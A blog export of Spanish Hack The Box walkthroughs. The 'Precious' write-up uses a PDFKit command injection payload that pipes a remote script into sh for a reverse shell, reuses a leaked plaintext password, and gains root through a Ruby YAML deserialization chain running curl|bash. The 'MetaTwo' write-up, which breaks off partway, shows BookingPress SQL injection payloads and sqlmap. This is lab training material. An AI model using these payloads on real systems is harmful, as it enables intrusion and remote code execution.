[{"content":"\rEn Precious identificamos y explotamos la vulnerabilidad de Command Injection existente en PDFKit la cual nos permitio el acceso a la maquina. Las credenciales en un archivo de configuracion nos permitieron acceder a un segundo usuario. Finalmente escalamos privilegios utilizando un archivo YAML.\nNombre Precious OS Linux Puntos 20 Dificultad Facil IP 10.10.11.189 Maker Nauten\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[3.5, 6, 9, 1, 4],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[0, 0, 0, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon nmap nmap muestra multiples puertos abiertos: http (80) y ssh (22).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 # Nmap 7.92 scan initiated Sat Nov 26 13:35:00 2022 as: nmap -p22,80 -sV -sC -oN nmap_scan 10.129.76.46 Nmap scan report for 10.129.76.46 (10.129.76.46) Host is up (0.10s latency). Scanned at 2022-11-26 13:35:01 CST for 9s PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA) | 256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA) |_ 256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519) 80/tcp open http nginx 1.18.0 |_http-title: Did not follow redirect to http://precious.htb/ |_http-server-header: nginx/1.18.0 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read from /usr/bin/../share/nmap: nmap-payloads nmap-service-probes nmap-services. Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Nov 26 13:35:10 2022 -- 1 IP address (1 host up) scanned in 9.83 seconds Web Site Los headers del sitio muestran una redirección al dominio precious.htb.\n1 2 3 4 5 6 7 8 9 10 ➜ precious curl -sI 10.129.76.46 HTTP/1.1 302 Moved Temporarily Server: nginx/1.18.0 Date: Sat, 26 Nov 2022 19:34:52 GMT Content-Type: text/html Content-Length: 145 Connection: keep-alive Location: http://precious.htb/ ➜ precious El sitio web unicamente presenta un formulario para una dirección de URL que aparentemente permite convertir un sitio web a PDF o lo que seria contenido HTML.\nAl ingresar nuestra dirección IP por le puerto 80 se listan los archivos en el directorio dentro de un archivo PDF.\nSi observamos la solicitud realizada, se muestra en los Headers wkhtmltopdf Version/10.0.\n1 2 3 4 5 6 7 8 9 10 11 ➜ precious sudo nc -lvvp 80 [sudo] password for kirby: listening on [any] 80 ... connect to [10.10.14.53] from precious.htb [10.129.76.84] 44152 GET / HTTP/1.1 Host: 10.10.14.53 User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/602.1 (KHTML, like Gecko) wkhtmltopdf Version/10.0 Safari/602.1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Connection: Keep-Alive Accept-Encoding: gzip, deflate Accept-Language: en-US,* Si realizamos la misma solicitud utilizando Burpsuite observamos que la respuesta, es decir el PDF, muestra información relevante, en este caso se observa que esta haciendo uso de Ruby, además en el contenido del pdf se muestra: wkhtmltopdf 0.12.6 y pdfkit v0.8.6.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 # response HTTP/1.1 200 OK Content-Type: application/pdf Content-Length: 10243 Connection: close Status: 200 OK Content-Disposition: attachment; filename=\u0026#34;hab1sv8krjm65qvqk2q62wj5ssim4amo.pdf\u0026#34; Last-Modified: Sat, 26 Nov 2022 20:52:19 GMT X-Content-Type-Options: nosniff Date: Sat, 26 Nov 2022 20:52:19 GMT X-Powered-By: Phusion Passenger(R) 6.0.15 Server: nginx/1.18.0 + Phusion Passenger(R) 6.0.15 X-Runtime: Ruby %PDF-1.4 %Ã¢Ã£ 1 0 obj \u0026lt;\u0026lt; /Title () /Creator (þÿwkhtmltopdf 0.12.6) /Producer (þÿQt 5.15.2) /CreationDate (D:20221220190959-05\u0026#39;00\u0026#39;) \u0026gt;\u0026gt; endobj 2 0 obj [.. snip ..] \u0026lt;\u0026lt; /Type /Metadata /Subtype /XML /Length 2829 \u0026gt;\u0026gt; stream \u0026lt;?xpacket begin=\u0026#39;ï»¿\u0026#39; id=\u0026#39;W5M0MpCehiHzreSzNTczkc9d\u0026#39;?\u0026gt; \u0026lt;x:xmpmeta xmlns:x=\u0026#39;adobe:ns:meta/\u0026#39;\u0026gt; \u0026lt;rdf:RDF xmlns:rdf=\u0026#39;http://www.w3.org/1999/02/22-rdf-syntax-ns#\u0026#39;\u0026gt; \u0026lt;rdf:Description rdf:about=\u0026#39;\u0026#39; xmlns:dc=\u0026#39;http://purl.org/dc/elements/1.1/\u0026#39;\u0026gt; \u0026lt;dc:creator\u0026gt; \u0026lt;rdf:Seq\u0026gt; \u0026lt;rdf:li\u0026gt;Generated by pdfkit v0.8.6\u0026lt;/rdf:li\u0026gt; \u0026lt;/rdf:Seq\u0026gt; \u0026lt;/dc:creator\u0026gt; \u0026lt;/rdf:Description\u0026gt; \u0026lt;/rdf:RDF\u0026gt; \u0026lt;/x:xmpmeta\u0026gt; [.. snip ..] \u0026lt;\u0026lt; /Size 19 /Info 1 0 R /Root 2 0 R /Prev 6546 \u0026gt;\u0026gt; %EndExifToolUpdate 6986 startxref 10045 %%EOF\tUser - Ruby Command Injetion Tras investigar ambas versiones encontramos una vulnerabilidad Command Injection en pdfkit (CVE-2022-25765) al ingresar \u0026ldquo;parametros\u0026rdquo; de tipo string #{}.\nEnviamos en el formulario un comando para realizar ping a nuestra máquina, tras ello obtuvimos una solicitud ping por parte de la máquina.\n1 http://10.10.14.207/#{\u0026#39;%20`ping -c 3 10.10.14.207`\u0026#39;} Shell Ejecutamos shells para una shell inversa.\n1 http://10.10.14.53:9999/index.html#{\u0026#39;%20`curl 10.10.14.53:3000/10.10.14.53:1335|sh`\u0026#39;} Obtuvimos acceso como usuario Ruby.\n1 2 3 4 5 6 7 8 9 10 11 12 13 ➜ precious rlwrap nc -lvp 1335 listening on [any] 1335 ... connect to [10.10.14.53] from precious.htb [10.129.76.84] 50710 /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ which python $ which python3 /usr/bin/python3 $ python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; ruby@precious:/var/www/pdfapp$ whoami;id;pwd ruby uid=1001(ruby) gid=1001(ruby) groups=1001(ruby) /var/www/pdfapp ruby@precious:/var/www/pdfapp$ Observamos el codigo fuente para generar el PDF.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 ruby@precious:/var/www/pdfapp/app/controllers$ cat pdf.rb class PdfControllers \u0026lt; Sinatra::Base configure do set :views, \u0026#34;app/views\u0026#34; set :public_dir, \u0026#34;public\u0026#34; end get \u0026#39;/\u0026#39; do erb :\u0026#39;index\u0026#39; end post \u0026#39;/\u0026#39; do url = ERB.new(params[:url]).result(binding) if url =~ /^https?:\\/\\//i filename = Array.new(32){rand(36).to_s(36)}.join + \u0026#39;.pdf\u0026#39; path = \u0026#39;pdf/\u0026#39; + filename begin PDFKit.new(url).to_file(path) cmd = `exiftool -overwrite_original -all= -creator=\u0026#34;Generated by pdfkit v0.8.6\u0026#34; -xmptoolkit= #{path}` send_file path, :disposition =\u0026gt; \u0026#39;attachment\u0026#39; rescue @msg = \u0026#39;Cannot load remote URL!\u0026#39; end else @msg = \u0026#39;You should provide a valid URL!\u0026#39; end erb :\u0026#39;index\u0026#39; end end ruby@precious:/var/www/pdfapp/app/controllers$ User - Henry Las credenciales de un archivo de configuración nos permitió acceder al usuario henry, y, la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 ruby@precious:/var/www/pdfapp$ cd ruby@precious:~$ ls -lah total 28K drwxr-xr-x 4 ruby ruby 4.0K Nov 26 15:20 . drwxr-xr-x 4 root root 4.0K Oct 26 08:28 .. lrwxrwxrwx 1 root root 9 Oct 26 07:53 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 ruby ruby 220 Mar 27 2022 .bash_logout -rw-r--r-- 1 ruby ruby 3.5K Mar 27 2022 .bashrc dr-xr-xr-x 2 root ruby 4.0K Oct 26 08:28 .bundle drwxr-xr-x 4 ruby ruby 4.0K Nov 26 15:20 .cache -rw-r--r-- 1 ruby ruby 807 Mar 27 2022 .profile ruby@precious:~$ cd .bundle ruby@precious:~/.bundle$ ls config ruby@precious:~/.bundle$ cat config --- BUNDLE_HTTPS://RUBYGEMS__ORG/: \u0026#34;henry:Q3c1AqGHtoI0aXAYFH\u0026#34; ruby@precious:~/.bundle$ cat /etc/passwd|grep bash root:x:0:0:root:/root:/bin/bash henry:x:1000:1000:henry,,,:/home/henry:/bin/bash ruby:x:1001:1001::/home/ruby:/bin/bash ruby@precious:~/.bundle$ su henry Password: Q3c1AqGHtoI0aXAYFH henry@precious:/home/ruby/.bundle$ whoami;id henry uid=1000(henry) gid=1000(henry) groups=1000(henry) henry@precious:/home/ruby/.bundle$ cd henry@precious:~$ ls user.txt henry@precious:~$ cat user.txt d696803fba5ac1e52a5254f60e1c58ab henry@precious:~$ Privesc El usuario Henry puede ejecutar como root el script update_dependencies.rb.\n1 2 3 4 5 6 7 8 9 10 11 12 13 henry@precious:~$ sudo -l -l Matching Defaults entries for henry on precious: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User henry may run the following commands on precious: Sudoers entry: RunAsUsers: root Options: !authenticate Commands: /usr/bin/ruby /opt/update_dependencies.rb henry@precious:~$ El script carga un archivo YAML en el cual obtiene nombre y version de la dependencia a actualizar.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 # Compare installed dependencies with those specified in \u0026#34;dependencies.yml\u0026#34; require \u0026#34;yaml\u0026#34; require \u0026#39;rubygems\u0026#39; # TODO: update versions automatically def update_gems() end def list_from_file YAML.load(File.read(\u0026#34;dependencies.yml\u0026#34;)) end def list_local_gems Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]} end gems_file = list_from_file gems_local = list_local_gems gems_file.each do |file_name, file_version| gems_local.each do |local_name, local_version| if(file_name == local_name) if(file_version != local_version) puts \u0026#34;Installed version differs from the one specified in file: \u0026#34; + local_name else puts \u0026#34;Installed version is equals to the one specified in file: \u0026#34; + local_name end end end end Tras observar el uso de YAML encontramos que Yaml.load es vulnerable y se muestran dos formas para la ejecución de comandos segun la versión de Ruby.\n1 2 3 henry@precious:~$ ruby -v ruby 2.7.4p191 (2021-07-07 revision a21a3b7d23) [x86_64-linux-gnu] henry@precious:~$ Tras crear nuestro archivo dependencies.yml con el codigo para ejecución del comando id observamos el resultado.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 henry@precious:~$ ls dependencies.yml user.txt henry@precious:~$ cat dependencies.yml --- - !ruby/object:Gem::Installer i: x - !ruby/object:Gem::SpecFetcher i: y - !ruby/object:Gem::Requirement requirements: !ruby/object:Gem::Package::TarReader io: \u0026amp;1 !ruby/object:Net::BufferedIO io: \u0026amp;1 !ruby/object:Gem::Package::TarReader::Entry read: 0 header: \u0026#34;abc\u0026#34; debug_output: \u0026amp;1 !ruby/object:Net::WriteAdapter socket: \u0026amp;1 !ruby/object:Gem::RequestSet sets: !ruby/object:Net::WriteAdapter socket: !ruby/module \u0026#39;Kernel\u0026#39; method_id: :system git_set: id method_id: :resolve henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb 2\u0026gt;/dev/null uid=0(root) gid=0(root) groups=0(root) henry@precious:~$ Agregamos la ejecución de una shell inversa.\n1 2 3 4 5 6 7 8 henry@precious:~$ cat dependencies.yml --- [.. snip ..] socket: !ruby/module \u0026#39;Kernel\u0026#39; method_id: :system git_set: curl 10.10.14.53:3000/10.10.14.53:1336 | bash method_id: :resolve henry@precious:~$ Tras ejecutar nuevamente el script logramos obtener una shell como root y nuestra flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 ➜ precious rlwrap nc -lvp 1336 listening on [any] 1336 ... connect to [10.10.14.53] from precious.htb [10.129.76.84] 40910 # whoami;id;pwd root uid=0(root) gid=0(root) groups=0(root) /home/henry # cd /root # ls root.txt # cat root.txt fcd883c54c37def311b73ea70510a952 # ","description":"En Precious identificamos y explotamos la vulnerabilidad de Command Injection existente en PDFKit la cual nos permitio el acceso a la maquina. Las credenciales en un archivo de configuracion nos permitieron acceder a un segundo usuario. Finalmente escalamos privilegios utilizando un archivo YAML.","id":0,"section":"posts","tags":["pdftohtml","wkhtmltopdf","ruby","pdfkit","sudo privesc","yaml","CVE-2022-25765"],"title":"Hack The Box - Precious","uri":"https://sckull.github.io/posts/precious/"},{"content":"\rEn MetaTwo encontramos dos plugins de WordPress vulnerables a Inyeccion SQL y XXE, lo que nos permitio acceder al servicio FTP, en consecuencia a un primer usuario. Finalmente escalamos privilegios tras desencriptar un archivo que contenia la contraseña del usuario root.\nNombre MetaTwo OS Linux Puntos 20 Dificultad Facil IP 10.10.11.186 Maker Nauten\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[5.5, 5.5, 5.8, 4.2, 4.5],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[7, 7, 7, 3, 3],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon nmap nmap muestra multiples puertos abiertos: ftp (21), http (80) y ssh (22).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 # Nmap 7.92 scan initiated Sat Nov 26 15:39:50 2022 as: nmap -p21,22,80 -sV -sC -oN nmap_scan 10.10.11.186 Nmap scan report for 10.10.11.186 (10.10.11.186) Host is up (0.29s latency). PORT STATE SERVICE VERSION 21/tcp open ftp? | fingerprint-strings: | GenericLines: | 220 ProFTPD Server (Debian) [::ffff:10.10.11.186] | Invalid command: try being more creative |_ Invalid command: try being more creative 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 c4:b4:46:17:d2:10:2d:8f:ec:1d:c9:27:fe:cd:79:ee (RSA) | 256 2a:ea:2f:cb:23:e8:c5:29:40:9c:ab:86:6d:cd:44:11 (ECDSA) |_ 256 fd:78:c0:b0:e2:20:16:fa:05:0d:eb:d8:3f:12:a4:ab (ED25519) 80/tcp open http nginx 1.18.0 |_http-title: Did not follow redirect to http://metapress.htb/ |_http-server-header: nginx/1.18.0 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port21-TCP:V=7.92%I=7%D=11/26%Time=638287B3%P=x86_64-pc-linux-gnu%r(Gen SF:ericLines,8F,\u0026#34;220\\x20ProFTPD\\x20Server\\x20\\(Debian\\)\\x20\\[::ffff:10\\.10 SF:\\.11\\.186\\]\\r\\n500\\x20Invalid\\x20command:\\x20try\\x20being\\x20more\\x20cr SF:eative\\r\\n500\\x20Invalid\\x20command:\\x20try\\x20being\\x20more\\x20creativ SF:e\\r\\n\u0026#34;); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Nov 26 15:43:36 2022 -- 1 IP address (1 host up) scanned in 225.81 seconds Web Site Los headers del sitio muestran una redirección al dominio metapress.htb.\n1 2 3 4 5 6 7 8 9 10 ➜ metatwo curl -sI 10.10.11.186 HTTP/1.1 302 Moved Temporarily Server: nginx/1.18.0 Date: Sat, 26 Nov 2022 21:49:28 GMT Content-Type: text/html Content-Length: 145 Connection: keep-alive Location: http://metapress.htb/ ➜ metatwo El sitio es un WordPress, se muestra una dirección para eventos.\nEn esta es posible agregar un nuevo evento, en este caso un Meeting.\nWPScan Tras ejecutar wpscan observamos la version de wordpress 5.6.2 y dos unicos usuarios.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 ➜ metatwo wpscan --url http://metapress.htb/ -e u _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.22 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: http://metapress.htb/ [10.10.11.186] [+] Started: Sat Nov 26 16:42:02 2022 Interesting Finding(s): [+] Headers | Interesting Entries: | - Server: nginx/1.18.0 | - X-Powered-By: PHP/8.0.24 | Found By: Headers (Passive Detection) | Confidence: 100% [+] robots.txt found: http://metapress.htb/robots.txt | Interesting Entries: | - /wp-admin/ | - /wp-admin/admin-ajax.php | Found By: Robots Txt (Aggressive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://metapress.htb/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://metapress.htb/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://metapress.htb/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 5.6.2 identified (Insecure, released on 2021-02-22). | Found By: Rss Generator (Passive Detection) | - http://metapress.htb/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.6.2\u0026lt;/generator\u0026gt; | - http://metapress.htb/comments/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.6.2\u0026lt;/generator\u0026gt; [+] WordPress theme in use: twentytwentyone | Location: http://metapress.htb/wp-content/themes/twentytwentyone/ | Last Updated: 2022-11-02T00:00:00.000Z | Readme: http://metapress.htb/wp-content/themes/twentytwentyone/readme.txt | [!] The version is out of date, the latest version is 1.7 | Style URL: http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1 | Style Name: Twenty Twenty-One | Style URI: https://wordpress.org/themes/twentytwentyone/ | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | Confirmed By: Css Style In 404 Page (Passive Detection) | | Version: 1.1 (80% confidence) | Found By: Style (Passive Detection) | - http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1, Match: \u0026#39;Version: 1.1\u0026#39; [+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:06 \u0026lt;==============\u0026gt; (10 / 10) 100.00% Time: 00:00:06 [i] User(s) Identified: [+] admin | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Wp Json Api (Aggressive Detection) | - http://metapress.htb/wp-json/wp/v2/users/?per_page=100\u0026amp;page=1 | Rss Generator (Aggressive Detection) | Author Sitemap (Aggressive Detection) | - http://metapress.htb/wp-sitemap-users-1.xml | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] manager | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) La pagina de WPScan nos muestra multiples vulnerabilidades para la versión de wordpress, observamos Authenticated XXE Within the Media Library Affecting PHP 8 y Authenticated Password Protected Pages Exposure, sin embargo no encontramos alguna que no solicitara credenciales.\nWordPress BookingPress - Unauthenticated SQL Injection Basados en las solicitudes realizadas por la creación del nuevo evento descubrimos el plugin BookingPress, asi mismo encontramos la vulnerabilidad Unauthenticated SQL Injection.\nWPScan agressive\rUtilizando el modo agresivo para enumeración de plugins de wpscan, tambien logró detectar el plugin bookingpress, entre otros, aunque esta forma toma mucho tiempo.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 [i] Plugin(s) Identified: [+] bookingpress-appointment-booking | Location: http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/ | Last Updated: 2022-12-13T11:42:00.000Z | Readme: http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/readme.txt | [!] The version is out of date, the latest version is 1.0.49 | | Found By: Known Locations (Aggressive Detection) | - http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/, status: 200 | | Version: 1.0.10 (100% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/readme.txt | Confirmed By: Translation File (Aggressive Detection) | - http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/languages/bookingpress-appointment-booking-en_US.po, Match: \u0026#39;sion: BookingPress Appointment Booking v1.0.10\u0026#39; [+] feed | Location: http://metapress.htb/wp-content/plugins/feed/ | | Found By: Known Locations (Aggressive Detection) | - http://metapress.htb/wp-content/plugins/feed/, status: 200 | | The version could not be determined. [+] leira-roles | Location: http://metapress.htb/wp-content/plugins/leira-roles/ | Latest Version: 1.1.8.0 (up to date) | Last Updated: 2022-05-05T05:13:00.000Z | Readme: http://metapress.htb/wp-content/plugins/leira-roles/README.txt | | Found By: Known Locations (Aggressive Detection) | - http://metapress.htb/wp-content/plugins/leira-roles/, status: 200 | | Version: 1.1.8.0 (100% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://metapress.htb/wp-content/plugins/leira-roles/README.txt | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) | - http://metapress.htb/wp-content/plugins/leira-roles/README.txt Con el PoC logramos obtener la version de MySQL, entre otros valores\n1 2 3 ➜ metatwo curl -s metapress.htb/wp-admin/admin-ajax.php --data \u0026#39;action=bookingpress_front_get_category_services\u0026amp;_wpnonce=fc0046577c\u0026amp;category_id=33\u0026amp;total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -\u0026#39; [{\u0026#34;bookingpress_service_id\u0026#34;:\u0026#34;10.5.15-MariaDB-0+deb11u1\u0026#34;,\u0026#34;bookingpress_category_id\u0026#34;:\u0026#34;Debian 11\u0026#34;,\u0026#34;bookingpress_service_name\u0026#34;:\u0026#34;debian-linux-gnu\u0026#34;,\u0026#34;bookingpress_service_price\u0026#34;:\u0026#34;$1.00\u0026#34;,\u0026#34;bookingpress_service_duration_val\u0026#34;:\u0026#34;2\u0026#34;,\u0026#34;bookingpress_service_duration_unit\u0026#34;:\u0026#34;3\u0026#34;,\u0026#34;bookingpress_service_description\u0026#34;:\u0026#34;4\u0026#34;,\u0026#34;bookingpress_service_position\u0026#34;:\u0026#34;5\u0026#34;,\u0026#34;bookingpress_servicedate_created\u0026#34;:\u0026#34;6\u0026#34;,\u0026#34;service_price_without_currency\u0026#34;:1,\u0026#34;img_url\u0026#34;:\u0026#34;http:\\/\\/metapress.htb\\/wp-content\\/plugins\\/bookingpress-appointment-booking\\/images\\/placeholder-img.jpg\u0026#34;}] ➜ metatwo También observamos el PoC de Time Based.\n1 2 3 4 5 ➜ metatwo date \u0026amp;\u0026amp; curl -s metapress.htb/wp-admin/admin-ajax.php --data \u0026#39;action=bookingpress_front_get_category_services\u0026amp;_wpnonce=fc0046577c\u0026amp;category_id=1\u0026amp;total_service=1) AND (SELECT 9578 FROM (SELECT(SLEEP(10)))iyUp)-- ZmjH\u0026#39; \u0026amp;\u0026amp; echo \u0026amp;\u0026amp; date sáb 26 nov 2022 16:25:43 CST [{\u0026#34;bookingpress_service_id\u0026#34;:\u0026#34;1\u0026#34;,\u0026#34;bookingpress_category_id\u0026#34;:\u0026#34;1\u0026#34;,\u0026#34;bookingpress_service_name\u0026#34;:\u0026#34;Startup meeting\u0026#34;,\u0026#34;bookingpress_service_price\u0026#34;:\u0026#34;$0.00\u0026#34;,\u0026#34;bookingpress_service_duration_val\u0026#34;:\u0026#34;30\u0026#34;,\u0026#34;bookingpress_service_duration_unit\u0026#34;:\u0026#34;m\u0026#34;,\u0026#34;bookingpress_service_description\u0026#34;:\u0026#34;Join us, we will celebrate our startup!\u0026#34;,\u0026#34;bookingpress_service_position\u0026#34;:\u0026#34;0\u0026#34;,\u0026#34;bookingpress_servicedate_created\u0026#34;:\u0026#34;2022-06-23 18:02:38\u0026#34;,\u0026#34;service_price_without_currency\u0026#34;:0,\u0026#34;img_url\u0026#34;:\u0026#34;http:\\/\\/metapress.htb\\/wp-content\\/plugins\\/bookingpress-appointment-booking\\/images\\/placeholder-img.jpg\u0026#34;}] sáb 26 nov 2022 16:25:54 CST ➜ metatwo Utilizamos sqlmap para obtener el nombre de las bases de datos, utilizando la la solicitud donde se encuentra la vulnerabilidad.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 ➜ metatwo sqlmap -r book_cat.req --batch --level 3 risk 3 -p total_service --risk 3 --level 3 --dbms mysql --dbs ___ __H__ ___ ___[\u0026#34;]_____ ___ ___ {1.6.9#stable} |_ -| . [)] | .\u0026#39;| . | |___|_ [,]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user\u0026#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 16:33:38 /2022-11-26/ [16:33:38] [INFO] parsing HTTP request from \u0026#39;book_cat.req\u0026#39; [16:33:38] [WARNING] provided value for parameter \u0026#39;total_service\u0026#39; is empty. Please, always use only valid parameter values so sqlmap could be able to run properly [16:33:38] [INFO] testing connection to the target URL sqlmap resumed the following injection point(s) from stored session: --- Parameter: total_service (POST) 